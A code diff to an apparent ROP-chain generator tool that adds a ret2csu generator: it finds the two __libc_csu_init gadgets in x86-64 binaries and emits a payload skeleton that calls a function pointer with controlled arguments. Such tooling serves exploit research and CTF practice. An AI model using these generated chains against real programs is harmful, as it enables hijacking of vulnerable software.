@@ -41,6 +41,7 @@ from re import match
 import itertools
 import math
 import sys
+import capstone
 
 if sys.version_info.major == 2:
     range = xrange
@@ -76,7 +77,7 @@ class RopChainX86_64(RopChain):
 
     @classmethod
     def availableGenerators(cls):
-        return [RopChainSystemX86_64, RopChainSpawnShellX86_64, RopChainMprotectX86_64]
+        return [RopChainSystemX86_64, RopChainSpawnShellX86_64, RopChainMprotectX86_64, RopChainRet2CsuX86_64]
 
     @classmethod
     def archs(self):
@@ -917,5 +918,248 @@ class RopChainMprotectX86_64(RopChainX86_64):
         chain += chain_tmp
         chain += 'rop += shellcode\n\n'
         chain += 'print(rop)\n'
+
+        return chain
+
+
+class RopChainRet2CsuX86_64(RopChainX86_64):
+    """Search for and generate ret2csu gadgets from __libc_csu_init.
+
+    __libc_csu_init contains two gadget sequences useful for controlling
+    the first three x86-64 calling convention arguments (rdi, rsi, rdx)
+    through registers loaded from the stack:
+
+    Gadget 1 (setup/pop):
+        pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+
+    Gadget 2 (dispatch/call):
+        mov rdx, r14|r15; mov rsi, r13|r14; mov edi, r12d|r13d;
+        call qword ptr [r15|r12 + rbx*8]
+
+    The exact register mapping depends on compiler version.  This
+    generator locates both gadget halves in the binary and emits a
+    chain that calls an arbitrary function pointer with controlled
+    rdi, rsi, and rdx.
+    """
+
+    # Known register mappings for different compiler versions.
+    _VARIANTS = [
+        # newer GCC (>= ~5): mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
+        {'rdx': 'r14', 'rsi': 'r13', 'edi': 'r12', 'call_base': 'r15'},
+        # older GCC (< ~5):  mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]
+        {'rdx': 'r15', 'rsi': 'r14', 'edi': 'r13', 'call_base': 'r12'},
+        # alternative older:  mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]
+        {'rdx': 'r13', 'rsi': 'r14', 'edi': 'r15', 'call_base': 'r12'},
+    ]
+
+    @classmethod
+    def usableTypes(self):
+        return (ELF, Raw)
+
+    @classmethod
+    def name(cls):
+        return 'ret2csu'
+
+    # Byte patterns for gadget 1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+    _GADGET1_BYTES = b'\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3'
+
+    # Byte patterns for the dispatch gadget (mov rdx; mov rsi; mov edi) per variant
+    _DISPATCH_BYTES = [
+        # newer GCC: mov rdx,r14; mov rsi,r13; mov edi,r12d
+        (b'\x4c\x89\xf2\x4c\x89\xee\x44\x89\xe7', 0),
+        # older GCC: mov rdx,r15; mov rsi,r14; mov edi,r13d
+        (b'\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef', 1),
+        # alternative: mov rdx,r13; mov rsi,r14; mov edi,r15d
+        (b'\x4c\x89\xea\x4c\x89\xf6\x44\x89\xff', 2),
+    ]
+
+    def _findCsuGadgets(self):
+        """Locate the two ret2csu gadget halves in the binary.
+
+        Uses raw byte pattern matching to find candidates, then verifies
+        with capstone disassembly.  Returns (gadget1_addr, gadget2_addr,
+        variant) or raises RopChainError.
+        """
+        binary = self._binaries[0]
+        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
+        md.detail = False
+
+        gadget1_addr = None
+        gadget2_addr = None
+        matched_variant = None
+
+        for section in binary.executableSections:
+            code = bytes(bytearray(section.bytes))
+            base = section.virtualAddress
+
+            # Search for gadget 1
+            if gadget1_addr is None:
+                idx = code.find(self._GADGET1_BYTES)
+                while idx >= 0:
+                    addr = base + idx
+                    snippet = list(md.disasm(code[idx:idx+len(self._GADGET1_BYTES)+2], addr))
+                    if (len(snippet) >= 7
+                            and snippet[0].mnemonic == 'pop' and snippet[0].op_str == 'rbx'
+                            and snippet[1].mnemonic == 'pop' and snippet[1].op_str == 'rbp'
+                            and snippet[2].mnemonic == 'pop' and snippet[2].op_str == 'r12'
+                            and snippet[3].mnemonic == 'pop' and snippet[3].op_str == 'r13'
+                            and snippet[4].mnemonic == 'pop' and snippet[4].op_str == 'r14'
+                            and snippet[5].mnemonic == 'pop' and snippet[5].op_str == 'r15'
+                            and snippet[6].mnemonic == 'ret'):
+                        gadget1_addr = addr
+                        break
+                    idx = code.find(self._GADGET1_BYTES, idx + 1)
+
+            # Search for gadget 2 (dispatch)
+            if matched_variant is None:
+                for pattern, variant_idx in self._DISPATCH_BYTES:
+                    idx = code.find(pattern)
+                    while idx >= 0:
+                        addr = base + idx
+                        snippet = list(md.disasm(code[idx:idx+20], addr))
+                        if (len(snippet) >= 4
+                                and snippet[0].mnemonic == 'mov'
+                                and snippet[1].mnemonic == 'mov'
+                                and snippet[2].mnemonic == 'mov'
+                                and snippet[3].mnemonic == 'call'
+                                and 'qword ptr' in snippet[3].op_str
+                                and 'rbx*8' in snippet[3].op_str):
+                            gadget2_addr = addr
+                            matched_variant = self._VARIANTS[variant_idx]
+                            break
+                        idx = code.find(pattern, idx + 1)
+                    if matched_variant is not None:
+                        break
+
+        if gadget1_addr is not None and gadget2_addr is not None and matched_variant is not None:
+            return (gadget1_addr, gadget2_addr, matched_variant)
+
+        raise RopChainError(
+            'Could not find ret2csu gadgets (__libc_csu_init) in the binary. '
+            'The binary may be statically linked without csu or compiled with '
+            'a non-standard toolchain.')
+
+    def create(self, options=None):
+        options = options or {}
+
+        self._printMessage('ROPchain Generator for ret2csu (__libc_csu_init):\n')
+        self._printMessage('Searching for __libc_csu_init gadgets...')
+
+        gadget1_addr, gadget2_addr, variant = self._findCsuGadgets()
+
+        self._printMessage('Found gadget 1 (setup) at %s' % toHex(gadget1_addr, 8))
+        self._printMessage('Found gadget 2 (dispatch) at %s' % toHex(gadget2_addr, 8))
+        self._printMessage('Variant: mov rdx,%s; mov rsi,%s; mov edi,%sd; '
+                           'call [%s+rbx*8]'
+                           % (variant['rdx'], variant['rsi'],
+                              variant['edi'], variant['call_base']))
+
+        # Determine register assignments from variant
+        rdx_src = variant['rdx']
+        rsi_src = variant['rsi']
+        edi_src = variant['edi']
+        call_base = variant['call_base']
+
+        # Parse options
+        func_ptr = options.get('func_ptr')
+        arg1 = options.get('arg1', '0x0')
+        arg2 = options.get('arg2', '0x0')
+        arg3 = options.get('arg3', '0x0')
+        call_addr = options.get('call')
+
+        # Register the primary binary for rebasing
+        idx = self._useBinaryForRebase()
+
+        chain = self._printHeader()
+        chain += self._printRebase()
+
+        chain += ('\n')
+        chain += ('# ret2csu gadgets from __libc_csu_init\n')
+        chain += ('# Gadget 1 (setup): pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret\n')
+        chain += ('# Gadget 2 (dispatch): mov rdx,%s; mov rsi,%s; mov edi,%sd; call [%s+rbx*8]\n'
+                  % (rdx_src, rsi_src, edi_src, call_base))
+        chain += ('\n')
+
+        g1_off = gadget1_addr - self._binaries[0].imageBase
+        g2_off = gadget2_addr - self._binaries[0].imageBase
+
+        chain += ('CSU_GADGET1 = %s # pop rbx..r15; ret\n' % toHex(g1_off, 8))
+        chain += ('CSU_GADGET2 = %s # mov rdx,%s; mov rsi,%s; mov edi,%sd; call [%s+rbx*8]\n\n'
+                  % (toHex(g2_off, 8), rdx_src, rsi_src, edi_src, call_base))
+
+        if func_ptr:
+            chain += ('FUNC_PTR = %s # address of pointer to function to call\n' % func_ptr)
+        else:
+            chain += ('FUNC_PTR = 0x4141414141414141 # TODO: address of pointer to function to call\n')
+            self._printMessage('No func_ptr given. Set func_ptr= to the address of a POINTER '
+                               'to the function you want to call (e.g. a GOT entry).')
+
+        if call_addr:
+            chain += ('CALL_ADDR = %s # address to call/return to after dispatch\n' % call_addr)
+        else:
+            chain += ('CALL_ADDR = 0x4242424242424242 # TODO: address to jump to after the csu call\n')
+
+        chain += ('\n')
+        chain += ('def csu_call(func_ptr, arg1, arg2, arg3):\n')
+        chain += ('    """Build a ret2csu payload fragment.\n')
+        chain += ('    func_ptr: address of a POINTER to the target function (e.g. GOT entry)\n')
+        chain += ('    arg1: rdi value (truncated to 32 bits by mov edi,...)\n')
+        chain += ('    arg2: rsi value\n')
+        chain += ('    arg3: rdx value\n')
+        chain += ('    """\n')
+        chain += ('    payload  = b""\n')
+        chain += ('    # Gadget 1: load registers from the stack\n')
+        chain += ('    payload += rebase_%d(CSU_GADGET1)\n' % idx)
+        chain += ('    payload += p(0x0)                # rbx = 0 (index into call table)\n')
+        chain += ('    payload += p(0x1)                # rbp = 1 (loop counter, ensures single call)\n')
+
+        # Assign the correct pop slots based on variant
+        pop_order = ['r12', 'r13', 'r14', 'r15']
+        slot_map = {}
+        slot_map[edi_src] = 'arg1'
+        slot_map[rsi_src] = 'arg2'
+        slot_map[rdx_src] = 'arg3'
+        slot_map[call_base] = 'func_ptr'
+
+        for reg in pop_order:
+            if reg in slot_map:
+                chain += ('    payload += p(%s)%s# %s -> %s\n'
+                          % (slot_map[reg],
+                             ' ' * (16 - len('p(%s)' % slot_map[reg])),
+                             reg, slot_map[reg]))
+            else:
+                chain += ('    payload += p(0xdeadbeef)     # %s (unused)\n' % reg)
+
+        chain += ('\n')
+        chain += ('    # Gadget 2: dispatch -- moves registers and calls [%s+rbx*8]\n' % call_base)
+        chain += ('    payload += rebase_%d(CSU_GADGET2)\n' % idx)
+        chain += ('\n')
+        chain += ('    # After the call returns, __libc_csu_init increments rbx and\n')
+        chain += ('    # compares it against rbp; since rbx=0+1==rbp=1 the loop exits\n')
+        chain += ('    # and falls through to another pop sequence:\n')
+        chain += ('    #   add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret\n')
+        chain += ('    payload += p(0x0)                # add rsp,8 padding\n')
+        chain += ('    payload += p(0x0)                # rbx\n')
+        chain += ('    payload += p(0x0)                # rbp\n')
+        chain += ('    payload += p(0x0)                # r12\n')
+        chain += ('    payload += p(0x0)                # r13\n')
+        chain += ('    payload += p(0x0)                # r14\n')
+        chain += ('    payload += p(0x0)                # r15\n')
+        chain += ('\n')
+        chain += ('    return payload\n')
+        chain += ('\n')
+        chain += ('rop = b""\n')
+        chain += ('rop += csu_call(FUNC_PTR, %s, %s, %s)\n' % (arg1, arg2, arg3))
+        chain += ('rop += p(CALL_ADDR)             # return address after csu dispatch\n')
+        chain += ('\n')
+        chain += ('print(rop)\n')
+
+        self._printMessage('')
+        self._printMessage('ret2csu chain generated!')
+        self._printMessage('Register mapping for this binary:')
+        self._printMessage('  rdi (arg1) <- %s (32-bit: mov edi, %sd)' % (edi_src, edi_src))
+        self._printMessage('  rsi (arg2) <- %s' % rsi_src)
+        self._printMessage('  rdx (arg3) <- %s' % rdx_src)
+        self._printMessage('  call target <- [%s + rbx*8]' % call_base)
 
         return chain
